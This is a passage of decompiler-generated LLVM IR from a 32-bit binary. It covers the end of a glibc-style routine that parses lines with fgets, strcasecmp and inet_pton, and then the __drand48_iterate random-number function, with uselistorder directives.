  %v1_80670d2 = add i32 %v0_80670e7110, 1
  store i32 %v1_80670d2, i32* @ecx, align 4
  %v1_80670d3 = inttoptr i32 %v1_80670d2 to i8*
  %v2_80670d3 = load i8, i8* %v1_80670d3, align 1
  %v3_80670d3 = zext i8 %v2_80670d3 to i32
  %v5_80670d3 = and i32 %v0_80670dc.pre, -256
  %v6_80670d3 = or i32 %v3_80670d3, %v5_80670d3
  store i32 %v6_80670d3, i32* @eax, align 4
  %v4_80670d5 = icmp eq i8 %v2_80670d3, 0
  br i1 %v4_80670d5, label %dec_label_pc_80670e7.loopexit, label %dec_label_pc_80670d9

dec_label_pc_80670d9:                             ; preds = %dec_label_pc_80670d9.lr.ph, %dec_label_pc_80670d2
  %v2_80670d3112 = phi i8 [ %v2_80670d3105, %dec_label_pc_80670d9.lr.ph ], [ %v2_80670d3, %dec_label_pc_80670d2 ]
  %v1_80670d3111 = phi i8* [ %v1_80670d3104, %dec_label_pc_80670d9.lr.ph ], [ %v1_80670d3, %dec_label_pc_80670d2 ]
  %v0_80670e7110 = phi i32 [ %v0_80670d3.pre, %dec_label_pc_80670d9.lr.ph ], [ %v1_80670d2, %dec_label_pc_80670d2 ]
  %v2_80670d9 = sext i8 %v2_80670d3112 to i32
  store i32 %v2_80670d9, i32* @edx, align 4
  store i32 %v0_80670dc.pre, i32* @eax, align 4
  %v2_80670e1 = mul nsw i32 %v2_80670d9, 2
  %v3_80670e1 = add i32 %v0_80670dc.pre, %v2_80670e1
  %v4_80670e1 = inttoptr i32 %v3_80670e1 to i8*
  %v5_80670e1 = load i8, i8* %v4_80670e1, align 1
  %v6_80670e1 = and i8 %v5_80670e1, 32
  %v7_80670e1 = icmp eq i8 %v6_80670e1, 0
  br i1 %v7_80670e1, label %dec_label_pc_80670d2, label %dec_label_pc_80670e7.loopexit

dec_label_pc_80670e7.loopexit:                    ; preds = %dec_label_pc_80670d9, %dec_label_pc_80670d2, %dec_label_pc_80670d3.preheader
  %v4_80670b397149 = phi i32 [ %v6_80670d3108, %dec_label_pc_80670d3.preheader ], [ %v6_80670d3, %dec_label_pc_80670d2 ], [ %v0_80670dc.pre, %dec_label_pc_80670d9 ]
  %v0_80670e7.lcssa = phi i32 [ %v0_80670d3.pre, %dec_label_pc_80670d3.preheader ], [ %v1_80670d2, %dec_label_pc_80670d2 ], [ %v0_80670e7110, %dec_label_pc_80670d9 ]
  %v1_80670d3.lcssa = phi i8* [ %v1_80670d3104, %dec_label_pc_80670d3.preheader ], [ %v1_80670d3, %dec_label_pc_80670d2 ], [ %v1_80670d3111, %dec_label_pc_80670d9 ]
  %v2_80670e7 = load i8, i8* %v1_80670d3.lcssa, align 1
  %v3_80670e7 = icmp eq i8 %v2_80670e7, 0
  %v1_80670ea = icmp eq i1 %v3_80670e7, false
  br i1 %v1_80670ea, label %dec_label_pc_80670b3.preheader, label %dec_label_pc_80670ec

dec_label_pc_80670b3.preheader:                   ; preds = %dec_label_pc_80670b3.preheader.preheader, %dec_label_pc_80670e7.loopexit
  %v1_80670ec.pre152 = phi i32 [ %v1_80670ec52, %dec_label_pc_80670e7.loopexit ], [ 0, %dec_label_pc_80670b3.preheader.preheader ]
  %v4_80670b397 = phi i32 [ %v4_80670b397149, %dec_label_pc_80670e7.loopexit ], [ %v4_80670b397.pre, %dec_label_pc_80670b3.preheader.preheader ]
  %v0_80670b347 = phi i32 [ %v0_80670e7.lcssa, %dec_label_pc_80670e7.loopexit ], [ %v4_8067195, %dec_label_pc_80670b3.preheader.preheader ]
  %v1_80670b394 = inttoptr i32 %v0_80670b347 to i8*
  %v2_80670b395 = load i8, i8* %v1_80670b394, align 1
  %v3_80670b396 = zext i8 %v2_80670b395 to i32
  %v5_80670b398 = and i32 %v4_80670b397, -256
  %v6_80670b399 = or i32 %v5_80670b398, %v3_80670b396
  store i32 %v6_80670b399, i32* @eax, align 4
  %v4_80670b5100 = icmp eq i8 %v2_80670b395, 0
  br i1 %v4_80670b5100, label %dec_label_pc_80670ec, label %dec_label_pc_80670b9

dec_label_pc_80670b3.dec_label_pc_80670ec.loopexit_crit_edge: ; preds = %dec_label_pc_80670af
  %v1_80670ec.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80670ec

dec_label_pc_80670ec:                             ; preds = %dec_label_pc_80670e7.loopexit, %dec_label_pc_80670b3.dec_label_pc_80670ec.loopexit_crit_edge, %dec_label_pc_80670b3.preheader, %dec_label_pc_80670a7
  %v1_80670ec = phi i32 [ 0, %dec_label_pc_80670a7 ], [ %v1_80670ec.pre.pre, %dec_label_pc_80670b3.dec_label_pc_80670ec.loopexit_crit_edge ], [ %v1_80670ec.pre152, %dec_label_pc_80670b3.preheader ], [ %v1_80670ec52, %dec_label_pc_80670e7.loopexit ]
  %v0_80670ec = load i32, i32* @ebx, align 4
  %v2_80670ec = mul i32 %v1_80670ec, 4
  %v3_80670ec = add i32 %v2_80670ec, %v0_80670ec
  %v4_80670ec = inttoptr i32 %v3_80670ec to i32*
  store i32 0, i32* %v4_80670ec, align 4
  %v0_80670f3 = load i32, i32* @edi, align 4
  %v7_80670f6 = icmp sgt i32 %v0_80670f3, 1
  br i1 %v7_80670f6, label %dec_label_pc_80670fc, label %dec_label_pc_806718f.backedge

dec_label_pc_80670fc:                             ; preds = %dec_label_pc_80670ec
  br i1 %v12_8066f38, label %dec_label_pc_80671c9, label %dec_label_pc_8067107

dec_label_pc_8067107:                             ; preds = %dec_label_pc_80670fc
  store i32 1, i32* @esi, align 4
  br i1 %v1_8067111, label %dec_label_pc_8067129.lr.ph, label %dec_label_pc_8067113

dec_label_pc_8067129.lr.ph:                       ; preds = %dec_label_pc_8067107
  br label %dec_label_pc_8067129

dec_label_pc_8067113:                             ; preds = %dec_label_pc_8067107
  %v4_806711b = call i32 @__GI_strcoll(i8* %v2_8067132)
  store i32 %v4_806711b, i32* %eax.global-to-local, align 4
  %v1_8067123 = icmp eq i32 %v4_806711b, 0
  %v1_8067125 = icmp eq i1 %v1_8067123, false
  br i1 %v1_8067125, label %dec_label_pc_806718f.backedge, label %dec_label_pc_8067145

dec_label_pc_806718f.backedge:                    ; preds = %dec_label_pc_806713e, %dec_label_pc_8067113, %dec_label_pc_80670ec
  %v0_806718f = load i32, i32* @edx, align 4
  %v3_8067199 = call i32 @fgets(i32 %v4_8067195, i32 %stack_var_4.0, i32 %v0_806718f)
  store i32 %v3_8067199, i32* %eax.global-to-local, align 4
  %v1_80671a1 = icmp eq i32 %v3_8067199, 0
  %v1_80671a3 = icmp eq i1 %v1_80671a1, false
  br i1 %v1_80671a3, label %dec_label_pc_8067090, label %dec_label_pc_80671a9

dec_label_pc_8067129:                             ; preds = %dec_label_pc_8067129.lr.ph, %dec_label_pc_806713e
  %v1_806712b124 = phi i32 [ 1, %dec_label_pc_8067129.lr.ph ], [ %v1_806713e, %dec_label_pc_806713e ]
  %v0_806712b = load i32, i32* @ebx, align 4
  %v2_806712b = mul i32 %v1_806712b124, 4
  %v3_806712b = add i32 %v0_806712b, %v2_806712b
  %v4_806712b = inttoptr i32 %v3_806712b to i32*
  %v5_806712b = load i32, i32* %v4_806712b, align 4
  %v3_8067132 = call i32 @__GI_strcasecmp(i8* %v2_8067132, i32 %v5_806712b)
  store i32 %v3_8067132, i32* %eax.global-to-local, align 4
  %v1_806713a = icmp eq i32 %v3_8067132, 0
  br i1 %v1_806713a, label %dec_label_pc_8067145, label %dec_label_pc_806713e

dec_label_pc_806713e:                             ; preds = %dec_label_pc_8067129
  %v0_806713e = load i32, i32* @esi, align 4
  %v1_806713e = add i32 %v0_806713e, 1
  store i32 %v1_806713e, i32* @esi, align 4
  %v1_806713f.pre = load i32, i32* @edi, align 4
  %v5_8067141 = icmp slt i32 %v1_806713e, %v1_806713f.pre
  br i1 %v5_8067141, label %dec_label_pc_8067129, label %dec_label_pc_806718f.backedge

dec_label_pc_8067145:                             ; preds = %dec_label_pc_8067113, %dec_label_pc_8067129
  br i1 %v1_806714a, label %dec_label_pc_8067167, label %dec_label_pc_806714c

dec_label_pc_806714c:                             ; preds = %dec_label_pc_8067145
  %v3_806714d = load i8*, i8** %stack_var_-44, align 4
  %v4_806714d = ptrtoint i8* %v3_806714d to i32
  %v0_8067151 = load i32, i32* @ebx, align 4
  %v1_8067151 = inttoptr i32 %v0_8067151 to i32*
  %v2_8067151 = load i32, i32* %v1_8067151, align 4
  %v3_8067155 = inttoptr i32 %v2_8067151 to i8*
  %v4_8067155 = call i32 @inet_pton(i32 2, i8* %v3_8067155, i32 %v4_806714d)
  store i32 %v4_8067155, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v4_8067155, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8066fe5, label %dec_label_pc_806718f.outer.backedge

dec_label_pc_806718f.outer.backedge:              ; preds = %dec_label_pc_806714c, %dec_label_pc_806716e, %dec_label_pc_8067167
  %v0_806718f125 = load i32, i32* @edx, align 4
  %v3_8067199126 = call i32 @fgets(i32 %v4_8067195, i32 %stack_var_4.0, i32 %v0_806718f125)
  store i32 %v3_8067199126, i32* %eax.global-to-local, align 4
  %v1_80671a1127 = icmp eq i32 %v3_8067199126, 0
  %v1_80671a3128 = icmp eq i1 %v1_80671a1127, false
  br i1 %v1_80671a3128, label %dec_label_pc_8067090.lr.ph, label %dec_label_pc_80671a9

dec_label_pc_8067167:                             ; preds = %dec_label_pc_8067145
  br i1 %v1_806716c, label %dec_label_pc_806718f.outer.backedge, label %dec_label_pc_806716e

dec_label_pc_806716e:                             ; preds = %dec_label_pc_8067167
  %v0_8067173 = load i32, i32* @ebx, align 4
  %v1_8067173 = inttoptr i32 %v0_8067173 to i32*
  %v2_8067173 = load i32, i32* %v1_8067173, align 4
  %v3_8067177 = inttoptr i32 %v2_8067173 to i8*
  %v4_8067177 = call i32 @inet_pton(i32 10, i8* %v3_8067177, i32 %stack_var_-36.0)
  store i32 %v4_8067177, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v4_8067177, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8067012, label %dec_label_pc_806718f.outer.backedge

dec_label_pc_80671a9:                             ; preds = %dec_label_pc_806718f.outer.backedge, %dec_label_pc_8067079, %dec_label_pc_806718f.backedge, %dec_label_pc_806703e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_806703e ], [ 1, %dec_label_pc_8067079 ], [ 2, %dec_label_pc_806718f.outer.backedge ], [ %stack_var_-28.0.ph136, %dec_label_pc_806718f.backedge ]
  br i1 %v12_8066f38, label %dec_label_pc_80671c9, label %dec_label_pc_80671b0

dec_label_pc_80671b0:                             ; preds = %dec_label_pc_80671a9
  %v1_80671b7 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80671b7 = call i32 @__GI_fclose(i16* %v1_80671b7)
  store i32 %v2_80671b7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80671c9

dec_label_pc_80671c9:                             ; preds = %dec_label_pc_80670fc, %dec_label_pc_8066f19, %dec_label_pc_8066f25, %dec_label_pc_8066f43, %dec_label_pc_8066f56, %dec_label_pc_8066f62, %dec_label_pc_8066f6b, %dec_label_pc_8066f95, %dec_label_pc_80671a9, %dec_label_pc_80671b0, %dec_label_pc_8066fcb
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80671a9 ], [ %stack_var_-28.1, %dec_label_pc_80671b0 ], [ %v2_8066fda, %dec_label_pc_8066fcb ], [ 34, %dec_label_pc_8066f95 ], [ 34, %dec_label_pc_8066f6b ], [ 34, %dec_label_pc_8066f62 ], [ 34, %dec_label_pc_8066f56 ], [ 34, %dec_label_pc_8066f43 ], [ 34, %dec_label_pc_8066f25 ], [ 34, %dec_label_pc_8066f19 ], [ %stack_var_-28.0.ph136, %dec_label_pc_80670fc ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8066f04, i32* @ebx, align 4
  store i32 %v0_8066f03, i32* @esi, align 4
  store i32 %v0_8066f02, i32* @edi, align 4
  store i32 %v0_8066f01, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_806713e, { 0, 2, 1 }
  uselistorder i8 %v2_80670b395, { 1, 2, 0 }
  uselistorder i8* %v1_80670b394, { 1, 0 }
  uselistorder i32 %v0_80670b347, { 1, 0 }
  uselistorder i32 %v2_80670d9, { 1, 0 }
  uselistorder i32 %v1_80670d2, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80670dc.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80670c7, { 1, 0 }
  uselistorder i32 %v0_80670c7, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80670b9, { 1, 0 }
  uselistorder i8* %v2_8067132, { 1, 0 }
  uselistorder i32 %v4_8067195, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8066f56, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8066f31, { 1, 0 }
  uselistorder i32 %v1_8066f14, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 6, 1, 11, 12, 17, 13, 15, 16, 14, 0, 7, 4, 5, 8, 9, 10, 18, 21, 19, 20, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 6, 7, 8, 9, 10, 11, 12, 19, 20, 21, 22, 0, 17, 18, 27, 28, 15, 4, 5, 23, 24, 29, 30, 2, 1, 3, 31, 25, 26, 13, 14, 16 }
  uselistorder i32 (i16*)* @__GI_fclose, { 8, 10, 0, 2, 3, 1, 4, 5, 6, 7, 9 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 4, 5, 6, 2, 0, 1, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 (i8*)* @__GI_strcoll, { 7, 8, 9, 10, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 -6, { 5, 1, 2, 6, 0, 3, 4 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 3, 4, 17, 28, 0, 1, 19, 2, 18, 25, 29, 30, 26, 27, 5, 6, 7, 8, 9, 10, 13, 12, 11, 14, 15, 16 }
  uselistorder i32* @global_var_8073fcc, { 0, 4, 2, 5, 1, 6, 3 }
  uselistorder i32 -256, { 2, 182, 1, 183, 40, 4, 129, 128, 3, 0, 112, 113, 184, 7, 186, 5, 187, 6, 188, 33, 34, 35, 28, 36, 37, 38, 39, 9, 131, 130, 8, 203, 204, 189, 205, 206, 207, 208, 209, 210, 223, 211, 68, 69, 114, 116, 10, 117, 118, 160, 161, 162, 201, 226, 227, 222, 41, 194, 42, 43, 191, 193, 29, 30, 31, 11, 237, 75, 74, 12, 115, 195, 185, 192, 190, 212, 213, 214, 215, 216, 217, 218, 13, 219, 220, 221, 196, 63, 44, 224, 225, 45, 228, 46, 47, 48, 231, 232, 233, 235, 236, 234, 230, 229, 19, 49, 32, 54, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65, 66, 67, 70, 71, 72, 20, 21, 22, 23, 24, 25, 26, 27, 73, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 108, 15, 109, 16, 110, 14, 107, 17, 119, 18, 120, 121, 122, 123, 124, 125, 126, 127, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 163, 164, 165, 166, 168, 167, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 197, 198, 199, 200, 202 }
  uselistorder i32 35, { 4, 6, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 21, 2, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 5, 9, 8, 7, 6 }
  uselistorder i32 (i32)* @__errno_location, { 59, 48, 46, 41, 40, 33, 32, 31, 30, 76, 56, 146, 145, 144, 143, 142, 141, 140, 152, 151, 150, 149, 44, 139, 39, 58, 38, 90, 89, 27, 26, 25, 85, 84, 83, 75, 94, 138, 34, 29, 24, 23, 74, 73, 72, 71, 137, 136, 135, 17, 28, 18, 117, 11, 69, 134, 54, 133, 132, 131, 55, 78, 148, 37, 36, 79, 35, 0, 53, 52, 93, 92, 91, 88, 63, 62, 61, 16, 70, 50, 10, 9, 8, 68, 51, 15, 102, 123, 122, 124, 101, 87, 4, 130, 129, 57, 67, 128, 1, 14, 19, 127, 95, 125, 42, 7, 2, 45, 66, 60, 47, 3, 126, 49, 43, 22, 6, 5, 121, 120, 65, 64, 119, 118, 21, 20, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 154, 104, 147, 103, 100, 13, 12, 99, 98, 97, 96, 86, 153, 82, 81, 80, 77 }
  uselistorder i32 80, { 0, 11, 14, 12, 13, 9, 15, 16, 17, 18, 19, 20, 3, 4, 8, 10, 5, 6, 1, 2, 7 }
  uselistorder i32 56, { 16, 28, 30, 5, 18, 19, 20, 21, 22, 2, 29, 3, 10, 6, 7, 1, 23, 15, 11, 24, 17, 14, 12, 9, 0, 31, 32, 25, 13, 26, 27, 8, 33, 34, 4 }
  uselistorder i32 44, { 21, 22, 23, 28, 29, 30, 24, 25, 13, 4, 6, 7, 5, 8, 9, 11, 10, 12, 20, 14, 15, 3, 34, 36, 35, 31, 32, 33, 0, 26, 16, 27, 19, 17, 2, 18, 37, 38, 1 }
  uselistorder i32 36, { 24, 25, 26, 28, 29, 30, 31, 32, 33, 2, 34, 3, 4, 35, 18, 19, 16, 36, 12, 13, 27, 22, 20, 11, 0, 10, 23, 37, 38, 39, 40, 17, 21, 6, 14, 5, 15, 8, 1, 7, 9 }
  uselistorder i32 -44, { 2, 1, 0 }
  uselistorder i32 48, { 29, 30, 31, 20, 21, 22, 0, 10, 6, 3, 1, 26, 27, 23, 24, 16, 25, 4, 11, 5, 7, 8, 32, 33, 34, 35, 2, 12, 15, 28, 17, 18, 19, 13, 36, 37, 14, 9 }
  uselistorder i32 -48, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 -32, { 36, 34, 0, 10, 11, 1, 5, 4, 3, 6, 7, 35, 9, 12, 8, 13, 14, 15, 20, 19, 18, 16, 17, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 2 }
  uselistorder i32 32, { 153, 54, 154, 155, 167, 59, 165, 65, 180, 181, 156, 80, 157, 158, 159, 78, 79, 1, 2, 112, 113, 114, 116, 4, 3, 6, 5, 68, 115, 7, 117, 118, 119, 120, 121, 122, 123, 124, 96, 97, 98, 99, 100, 101, 0, 8, 102, 103, 104, 166, 87, 88, 168, 46, 135, 136, 125, 126, 188, 60, 86, 147, 148, 149, 47, 182, 10, 9, 11, 12, 81, 13, 185, 14, 15, 16, 17, 18, 19, 55, 56, 53, 61, 62, 105, 63, 106, 107, 108, 160, 161, 162, 169, 170, 57, 171, 172, 173, 174, 175, 176, 177, 20, 178, 179, 82, 183, 184, 163, 164, 127, 128, 129, 130, 109, 150, 186, 187, 133, 22, 21, 23, 24, 25, 26, 27, 131, 132, 110, 111, 89, 58, 90, 91, 92, 93, 94, 28, 29, 134, 31, 30, 69, 95, 33, 32, 70, 35, 34, 71, 37, 36, 73, 39, 38, 72, 137, 41, 40, 74, 75, 48, 49, 50, 51, 66, 42, 83, 84, 138, 139, 140, 141, 76, 64, 142, 143, 144, 145, 52, 146, 45, 151, 67, 152, 77, 44, 43, 85 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80671c9, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_80671a9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_806718f.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8067145, { 1, 0 }
  uselistorder label %dec_label_pc_8067129, { 1, 0 }
  uselistorder label %dec_label_pc_80670ec, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80670b3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80670d9, { 1, 0 }
  uselistorder label %dec_label_pc_80670a7, { 1, 0 }
  uselistorder label %dec_label_pc_8067090, { 1, 0 }
  uselistorder label %dec_label_pc_8067090.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8067079, { 1, 0 }
  uselistorder label %dec_label_pc_806703e, { 1, 0 }
  uselistorder label %dec_label_pc_8066f95, { 1, 0 }
  uselistorder label %dec_label_pc_8066f25, { 1, 0 }
}

define i32 @__drand48_iterate(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_80671e3 = add i32 %arg2, 14
  %v2_80671e3 = inttoptr i32 %v1_80671e3 to i16*
  %v3_80671e3 = load i16, i16* %v2_80671e3, align 2
  %v4_80671e3 = icmp eq i16 %v3_80671e3, 0
  %v1_80671e8 = icmp eq i1 %v4_80671e3, false
  br i1 %v1_80671e8, label %dec_label_pc_8067204, label %dec_label_pc_80671ea

dec_label_pc_80671ea:                             ; preds = %entry
  %v1_80671ea = add i32 %arg2, 16
  %v2_80671ea = inttoptr i32 %v1_80671ea to i32*
  store i32 -554899859, i32* %v2_80671ea, align 4
  %v0_80671f1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80671f1 = add i32 %v0_80671f1, 20
  %v2_80671f1 = inttoptr i32 %v1_80671f1 to i32*
  store i32 5, i32* %v2_80671f1, align 4
  %v0_80671f8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80671f8 = add i32 %v0_80671f8, 12
  %v2_80671f8 = inttoptr i32 %v1_80671f8 to i16*
  store i16 11, i16* %v2_80671f8, align 2
  %v0_80671fe = load i32, i32* %esi.global-to-local, align 4
  %v1_80671fe = add i32 %v0_80671fe, 14
  %v2_80671fe = inttoptr i32 %v1_80671fe to i16*
  store i16 1, i16* %v2_80671fe, align 2
  %v0_806722e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8067204

dec_label_pc_8067204:                             ; preds = %entry, %dec_label_pc_80671ea
  %v0_8067247 = phi i32 [ %arg2, %entry ], [ %v0_806722e.pre, %dec_label_pc_80671ea ]
  %v4_8067204 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8067204, i32* %edx.global-to-local, align 4
  store i32 %v4_8067204, i32* %ecx.global-to-local, align 4
  %v1_806720c = add i32 %v4_8067204, 2
  %v2_806720c = inttoptr i32 %v1_806720c to i16*
  %v3_806720c = load i16, i16* %v2_806720c, align 2
  %v4_806720c = zext i16 %v3_806720c to i32
  %v2_8067210 = mul nuw i32 %v4_806720c, 65536
  store i32 %v2_8067210, i32* %eax.global-to-local, align 4
  %v1_806721e = add i32 %v4_8067204, 4
  %v2_806721e = inttoptr i32 %v1_806721e to i16*
  %v3_806721e = load i16, i16* %v2_806721e, align 2
  %v4_806721e = zext i16 %v3_806721e to i32
  store i32 %v4_806721e, i32* %eax.global-to-local, align 4
  %v2_8067222 = load i16, i16* %arg1, align 2
  %v3_8067222 = zext i16 %v2_8067222 to i32
  store i32 %v3_8067222, i32* %ecx.global-to-local, align 4
  store i32 %v4_806721e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_806722e = add i32 %v0_8067247, 16
  %v2_806722e = inttoptr i32 %v1_806722e to i32*
  %v3_806722e = load i32, i32* %v2_806722e, align 4
  store i32 %v3_8067222, i32* %eax.global-to-local, align 4
  store i32 %v4_806721e, i32* %edx.global-to-local, align 4
  %v2_8067238 = or i32 %v3_8067222, %v2_8067210
  store i32 %v2_8067238, i32* %ecx.global-to-local, align 4
  %v4_806723a = mul i32 %v3_806722e, %v4_806721e
  %v1_806723d = add i32 %v0_8067247, 20
  %v2_806723d = inttoptr i32 %v1_806723d to i32*
  %v3_806723d = load i32, i32* %v2_806723d, align 4
  store i32 %v2_8067238, i32* %eax.global-to-local, align 4
  %v4_8067242 = mul i32 %v3_806723d, %v2_8067238
  store i32 %v4_8067242, i32* %edx.global-to-local, align 4
  %v2_8067245 = add i32 %v4_8067242, %v4_806723a
  %v3_8067247 = load i32, i32* %v2_806722e, align 4
  %v5_8067247 = zext i32 %v3_8067247 to i64
  %v6_8067247 = zext i32 %v2_8067238 to i64
  %v7_8067247 = mul nuw i64 %v5_8067247, %v6_8067247
  %v8_8067247 = trunc i64 %v7_8067247 to i32
  %v9_8067247 = udiv i64 %v7_8067247, 4294967296
  %v10_8067247 = trunc i64 %v9_8067247 to i32
  store i32 %v8_8067247, i32* %eax.global-to-local, align 4
  store i32 %v10_8067247, i32* %edx.global-to-local, align 4
  store i32 %v8_8067247, i32* %ecx.global-to-local, align 4
  %v1_806724c = add i32 %v0_8067247, 12
  %v2_806724c = inttoptr i32 %v1_806724c to i16*
  %v3_806724c = load i16, i16* %v2_806724c, align 2
  %v4_806724c = zext i16 %v3_806724c to i32
  %v2_8067250 = add i32 %v10_8067247, %v2_8067245
  %v2_8067255 = add i32 %v4_806724c, %v8_8067247
  %v7_8067255 = icmp ult i32 %v2_8067255, %v4_806724c
  store i32 %v2_8067255, i32* %eax.global-to-local, align 4
  store i32 %v4_8067204, i32* %ecx.global-to-local, align 4
  %v3_806725b = zext i1 %v7_8067255 to i32
  %v5_806725b = add i32 %v2_8067250, %v3_806725b
  store i32 %v5_806725b, i32* %edx.global-to-local, align 4
  %v1_806725d = trunc i32 %v2_8067255 to i16
  store i16 %v1_806725d, i16* %arg1, align 2
  %v0_8067260 = load i32, i32* %eax.global-to-local, align 4
  %v3_8067260 = udiv i32 %v0_8067260, 65536
  %v4_8067260 = mul i32 %v5_806725b, 65536
  %v5_8067260 = or i32 %v4_8067260, %v3_8067260
  store i32 %v5_8067260, i32* %eax.global-to-local, align 4
  %v2_8067264 = udiv i32 %v5_806725b, 65536
  store i32 %v2_8067264, i32* %edx.global-to-local, align 4
  %v1_8067267 = trunc i32 %v3_8067260 to i16
  %v2_8067267 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8067267 = add i32 %v2_8067267, 2
  %v4_8067267 = inttoptr i32 %v3_8067267 to i16*
  store i16 %v1_8067267, i16* %v4_8067267, align 2
  %v0_806726b = load i32, i32* %eax.global-to-local, align 4
  %v1_806726b = load i32, i32* %edx.global-to-local, align 4
  %v3_806726b = udiv i32 %v0_806726b, 65536
  %v2_806726f = udiv i32 %v1_806726b, 65536
  store i32 %v2_806726f, i32* %edx.global-to-local, align 4
  %v1_8067272 = trunc i32 %v3_806726b to i16
  %v2_8067272 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8067272 = add i32 %v2_8067272, 4
  %v4_8067272 = inttoptr i32 %v3_8067272 to i16*
  store i16 %v1_8067272, i16* %v4_8067272, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_806724c, { 1, 0 }
  uselistorder i32 %v2_8067238, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8067210, { 1, 0 }
  uselistorder i32 %v4_8067204, { 3, 0, 2, 1, 4 }
  uselistorder i32* %esi.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 33, 35, 34 }
  uselistorder i32 65536, { 5, 6, 7, 3, 8, 4, 9, 10, 11, 12, 13, 14, 15, 17, 16, 19, 18, 21, 20, 23, 22, 24, 25, 26, 173, 175, 28, 29, 27, 30, 163, 31, 0, 32, 34, 33, 36, 35, 37, 38, 42, 39, 43, 40, 44, 41, 48, 45, 49, 46, 50, 47, 51, 52, 54, 53, 56, 55, 57, 58, 60, 165, 61, 59, 63, 164, 64, 62, 68, 166, 69, 70, 65, 167, 71, 168, 160, 72, 169, 73, 74, 66, 170, 75, 171, 161, 67, 76, 77, 78, 79, 80, 81, 84, 83, 82, 85, 86, 90, 87, 93, 91, 88, 94, 92, 89, 95, 96, 98, 97, 99, 100, 105, 101, 106, 102, 107, 103, 108, 104, 112, 109, 113, 110, 114, 111, 115, 117, 116, 119, 118, 121, 120, 122, 123, 124, 125, 127, 126, 133, 128, 134, 129, 140, 141, 135, 130, 136, 137, 131, 138, 132, 139, 1, 2, 146, 142, 147, 143, 150, 148, 144, 151, 149, 145, 153, 162, 152, 154, 155, 157, 172, 156, 158, 159, 174 }
  uselistorder i16 1, { 3, 4, 2, 1, 0 }
